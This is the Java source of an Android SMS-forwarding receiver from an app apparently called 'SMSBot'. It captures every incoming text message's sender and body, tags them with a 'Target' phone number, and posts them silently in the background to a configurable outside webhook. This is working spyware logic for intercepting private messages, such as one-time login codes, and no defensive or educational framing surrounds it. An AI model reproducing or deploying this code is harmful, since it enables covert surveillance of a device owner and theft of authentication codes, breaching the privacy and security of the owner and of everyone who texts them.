package com.ton.smsbotv2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;

import java.io.IOException;
import java.util.HashMap;

public class MessageReceiver extends BroadcastReceiver {
    SharePrefHelper sharePref = new SharePrefHelper();

    @Override
    public void onReceive(Context context, Intent intent) {
        String phoneNo = sharePref.getFromSharePref(context, "PhoneNo");
        String webHook = sharePref.getFromSharePref(context, "WebHook");
        String message = "\n------------------------\nTarget: " + phoneNo;
        Bundle data = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");
        for (int i = 0; i < pdus.length; i++) {
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);

            if (i == 0) {
                message = message + "\nSender : " + smsMessage.getDisplayOriginatingAddress()
                        + "\nMessage: " + smsMessage.getMessageBody();
            } else {
                message = message + smsMessage.getMessageBody();
            }
        }
        message = message + "\n------------------------";
        AsyncTaskBackGround a = new AsyncTaskBackGround();
        a.execute(webHook, message);
    }

    private class AsyncTaskBackGround extends AsyncTask<String, Void, Void> {
        String text = "";

        @Override
        protected void onPreExecute() {
        }

        @Override
        protected Void doInBackground(String... params) {
            try {
                OkHttpHelper httpHelper = new OkHttpHelper();
                try {
                    HashMap<String, String> hashMap = new HashMap<>();
                    hashMap.put("username", "SMSBot");
                    hashMap.put("content", params[1]);
                    text = httpHelper.postHeader(params[0], hashMap);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
        }
    }
}
